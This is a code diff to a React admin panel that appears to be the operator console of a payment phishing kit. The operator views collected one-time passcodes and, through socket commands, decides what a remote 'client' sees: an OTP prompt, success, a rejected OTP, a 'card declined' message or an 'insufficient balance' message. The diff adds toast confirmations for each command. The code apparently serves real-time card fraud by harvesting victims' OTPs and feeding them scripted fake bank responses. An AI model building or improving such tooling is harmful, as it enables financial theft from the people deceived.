@@ -195,27 +195,51 @@ const Admin = () => {
       switch (action) {
         case 'show-otp':
           socket.emit('show-otp');
+          toast({
+            title: "Command Initiated",
+            description: "OTP request sent to client",
+          });
           break;
         case 'validate-otp':
           socket.emit('payment-approved');
           updatePaymentStatus(paymentId, 'approved');
           // Clear OTP after validation
           setOtps([]);
+          toast({
+            title: "Command Initiated",
+            description: "Payment approved - client redirecting to success page",
+          });
           break;
         case 'fail-otp':
           socket.emit('invalid-otp-error');
+          toast({
+            title: "Command Initiated",
+            description: "Invalid OTP response sent to client",
+          });
           break;
         case 'card-declined':
           socket.emit('card-declined-error');
+          toast({
+            title: "Command Initiated", 
+            description: "Card declined response sent to client",
+          });
           break;
         case 'insufficient-balance':
           socket.emit('insufficient-balance-error');
+          toast({
+            title: "Command Initiated",
+            description: "Insufficient balance response sent to client", 
+          });
           break;
         case 'successful':
           socket.emit('payment-approved');
           updatePaymentStatus(paymentId, 'approved');
           // Clear OTP after success
           setOtps([]);
+          toast({
+            title: "Command Initiated", 
+            description: "Payment successful - client redirecting to success page",
+          });
           break;
         default:
           console.error('Unknown action:', action);
